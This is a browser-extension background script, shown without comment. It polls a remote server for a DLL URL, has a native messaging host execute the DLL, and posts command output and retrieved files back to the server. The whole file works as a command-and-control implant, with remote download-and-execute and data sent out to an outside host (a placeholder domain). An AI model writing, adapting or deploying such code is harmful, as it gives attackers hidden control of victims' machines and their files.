let port = null;

// Connect to the native app
function connectToNativeApp() {
    if (port) return;

    port = chrome.runtime.connectNative("NAME OF THE REGISTRY ENTRY");

    port.onMessage.addListener((response) => {
        console.log("Response from native app:", response);

        if (response.status === "success" && response.output) {
            try {
                // Try to parse as JSON to determine if it's a file response
                let isFileResponse = false;
                try {
                    const parsedOutput = JSON.parse(response.output);
                    isFileResponse = parsedOutput.type === 'file';
                } catch (parseError) {
                    // Not a JSON or not a file response
                    isFileResponse = false;
                }

                // Send to webapp with appropriate type
                fetch('https://subdomain.domain/send-plugin-response', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        response: isFileResponse ? "File retrieved" : "Command executed",
                        status: "success",
                        output: response.output,
                        output_type: isFileResponse ? "file" : "command",
                        timestamp: Date.now()
                    })
                })
                .then(response => response.text())
                .then(result => console.log('Success:', result))
                .catch(error => console.error('Error sending to webapp:', error));
            } catch (error) {
                console.error("Error processing response:", error);
                // Send error to webapp
                fetch('https://subdomain.domain/send-plugin-response', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        response: "Error",
                        status: "error",
                        output: "Failed to process response: " + error.message,
                        output_type: "error",
                        timestamp: Date.now()
                    })
                }).catch(error => console.error("Error sending error response:", error));
            }
        } else if (response.status === "error") {
            // Handle error responses from native app
            fetch('https://subdomain.domain/send-plugin-response', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    response: "Error",
                    status: "error",
                    output: response.message || "Unknown error",
                    output_type: "error",
                    timestamp: Date.now()
                })
            }).catch(error => console.error("Error sending error response:", error));
        }
    });

    port.onDisconnect.addListener(() => {
        console.error(
            "Disconnected from native app:",
            chrome.runtime.lastError?.message || "Unknown error"
        );
        console.log("Reconnecting to native app...");
        port = null;
        setTimeout(connectToNativeApp, 1000);
    });

    console.log("Connected to native app.");
}

// Send a message to the native app
function sendMessageToNativeApp(action, url) {
    if (!port) {
        console.error("No active connection to the native app. Reconnecting...");
        connectToNativeApp();
        setTimeout(() => sendMessageToNativeApp(action, url), 1000);
        return;
    }

    const message = { action, url };
    console.log("Sending message to native app:", message);
    port.postMessage(message);
}

// Poll the web app for a DLL URL
async function pollWebApp() {
    try {
        const response = await fetch("https://subdomain.domain/plugin-request", { 
            method: "POST",
            headers: {
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        const text = await response.text();
        let result;
        try {
            result = JSON.parse(text);
        } catch (e) {
            console.error("Invalid JSON response:", text);
            setTimeout(pollWebApp, 10000);
            return;
        }

        // Process the response
        if (!result.response || result.response === "no") {
            console.log("Received 'no' response. Retrying in 10 seconds...");
            setTimeout(pollWebApp, 10000);
        } else if (result.response.startsWith("http")) {
            console.log("Received URL:", result.response);
            sendMessageToNativeApp("executeDLL", result.response);
        } else {
            console.error("Unexpected response:", result.response);
            setTimeout(pollWebApp, 10000);
        }
    } catch (error) {
        console.error("Error polling web app:", error.message);
        setTimeout(pollWebApp, 10000);
    }
}

// Call these functions every 30 seconds
setInterval(() => {
    console.log("Calling connectToNativeApp() and pollWebApp()...");
    if (!port) {
        connectToNativeApp();
    }
    pollWebApp();
}, 30000);

// Start the process
connectToNativeApp();
pollWebApp();
